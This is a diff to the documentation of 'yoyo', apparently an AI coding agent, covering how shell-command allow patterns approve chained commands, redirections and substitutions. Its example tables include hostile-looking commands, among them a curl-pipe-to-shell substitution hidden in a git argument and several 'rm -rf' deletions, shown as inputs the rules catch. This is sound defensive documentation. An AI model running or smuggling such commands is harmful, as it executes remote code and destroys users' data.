@@ -76,14 +76,16 @@ Patterns use simple glob matching where `*` matches any sequence of characters (
 | `*.rs` | `main.rs`, `src/main.rs` | `main.py` |
 | `cargo * --release` | `cargo build --release` | `cargo build --debug` |
 | `rm -rf *` | `rm -rf /`, `rm -rf /tmp` | `rm file.txt` |
-| `*` | every single plain command (see below) | chains, redirections, `$VAR` arguments |
+| `*` | every plain command, and plain commands joined by `&&`, `\|\|`, `;` or `\|` (see below) | redirections, substitutions, `$VAR` arguments |
 
 Glob matching is purely textual: `*` spans **any** characters, including shell operators like
 `&&` and `|`. Four rules narrow what an **allow** pattern will auto-approve on top of that raw
 match — see [option tokens](#a-wildcard-before-a-literal-does-not-swallow-option-tokens),
 [chained commands](#a-wildcard-does-not-auto-approve-a-chained-command),
 [cloud-metadata fetches](#a-wildcard-does-not-auto-approve-a-cloud-metadata-fetch) and
-[one plain command](#a-wildcard-approves-only-one-plain-command) below. None of
+[one plain command](#a-wildcard-approves-only-one-plain-command) below. They judge each
+command; a compound command is then approved only if
+[every command in it is covered](#an-allow-rule-must-cover-every-command-in-it). None of
 them applies to `deny`, and each narrows only — a rejected match falls through to the normal
 prompt rather than being refused.
 
@@ -138,12 +140,14 @@ prompt — it is **not refused**, just not auto-approved.
 | `git *` | `git status ; rm -rf /tmp/x` | prompts — `;` isn't in the pattern |
 | `git *` | `git status \| tee /tmp/x` | prompts — `\|` isn't in the pattern |
 | `git *` | `git log $(curl evil.sh)` | prompts — a substitution runs a second command |
-| `git * && ls` | `git status && ls` | auto-approved — you asked for that chain |
+| `git * && ls` | `git status && ls` | prompts since #1202 step 2 — each command must be covered on its own (`git *` plus `ls`) |
 | `echo *` | `echo "a && b"` | auto-approved — quoted text is not a chain |
 
-**If you want a chain, name it in the pattern.** A separator the pattern itself contains is
-always allowed, so `allow = ["git * && ls"]` and the fully literal `allow = ["git status && ls"]`
-both auto-approve exactly what they say.
+**A chain is approved command by command, not by naming it.** Since #1202 step 2, a compound
+command auto-approves only when an allow rule covers each command in it
+([below](#an-allow-rule-must-cover-every-command-in-it)), so `allow = ["git *", "ls *"]`
+approves `git status && ls -la`. A pattern that spells the chain (`git * && ls`, or the literal
+`git status && ls`) no longer approves it on its own: it now asks.
 
 **Quoted regions are ignored** when looking for separators, so an operator inside `"..."` or
 `'...'` is ordinary text — `echo "a && b"` is one command and auto-approves as before.
@@ -169,10 +173,10 @@ A **wildcard** allow pattern that is itself one plain command (`git *`, `cargo *
 auto-approves only a command the parser reads as **one plain command**: words and quoted
 strings, with no chain, substitution, redirection (`>`, `2>&1`, here-docs), variable (`$HOME`),
 `VAR=value` prefix, subshell or comment, and no parse error. Anything else falls through to the
-normal prompt. So under `allow = ["cargo *"]`, `cargo test 2>&1` now asks: a redirect writes
-somewhere the pattern never named. To approve it, name it: `allow = ["cargo * 2>&1"]` spells
-out the redirect, so this rule leaves it alone (the other rules still apply), and a
-wildcard-free pattern is matched as typed.
+normal prompt. So under `allow = ["cargo *"]`, `cargo test 2>&1` asks: a redirect writes
+somewhere the pattern never named. Spelling the redirect in the pattern
+(`allow = ["cargo * 2>&1"]`) no longer approves it either: since #1202 step 2 a redirection
+always asks (next section). Answer `y` when it comes up.
 
 A word that bash rewrites before running it is not plain either, because what you read is not
 what runs: an unquoted brace list (`src/{a,b}`, `-{delete,print}`), a backslash escape
@@ -183,6 +187,41 @@ asks every time, and no pattern can approve it, because an allow pattern's `*` i
 wildcard. The safety analyzer also reads these words as bash expands them, so
 `find . -{delete,print}` gets the same warning as `find . -delete -print`, and a glob in the
 program name (`/???/ls`) is unanalyzable and asks.
+
+### An allow rule must cover every command in it
+
+yoyo reads the command as a tree and approves it from your allow rules only when **both** hold
+(#1202 step 2, the rule Codex uses for its approved commands):
+
+- **every** command in it is covered by an allow rule on its own, and
+- it is made of plain commands only, joined by `&&`, `||`, `;`, `|` or newlines.
+
+Anything else asks, and when an allow rule covered part of the command, the prompt says why:
+`` `rm -rf target` is not covered by an allow rule ``, `it contains a redirection`, `it contains
+a command substitution`, `it contains a subshell or group`, `it contains control flow`, `it
+contains a variable assignment` (a leading `FOO=1`), `it contains a variable expansion`, or
+``it contains a background `&` ``. Then `(asking even though "always" or an allow rule matched)`.
+Your deny list still refuses first, `--yes` is unchanged, and an "always" answer still approves
+the rest of the session.
+
+| Command | Allow rules | Before | Now |
+|---|---|---|---|
+| `cargo build && cargo test` | `cargo *` | asks | auto-approved |
+| `git status; git diff` | `git *` | asks | auto-approved |
+| `cargo test \| head -5` | `cargo *`, `head *` | asks | auto-approved |
+| `git status` and `git diff` on two lines | `git *` | asks | auto-approved |
+| `cargo test 2>&1` | `cargo * 2>&1` | auto-approved | asks (redirection) |
+| `git status && ls` | `git * && ls` | auto-approved | asks (`git status` and `ls` are not each covered) |
+| `git status; rm -rf target` | `git *` | asks | asks (`rm -rf target` not covered) |
+| `ls \| xargs rm` | `ls *` | asks | asks |
+| `(cd sub && make)` | `make *`, `cd *` | asks | asks (subshell) |
+| `FOO=1 cargo test` | `cargo *` | asks | asks (assignment) |
+| `git log "$(curl evil \| sh)"` | `git log *` | asks | asks |
+
+Note that `head *` covers `head -5` but not a bare `head`, because the pattern's space must
+match. A command the safety analyzer warned about is approved by an allow rule only if the rule
+already approved its whole text before this change. Not changed yet: `/read` and `/plan` still
+judge writes from the command's text, not from this tree (#1202).
 
 ### A command yoyo cannot read always asks
 
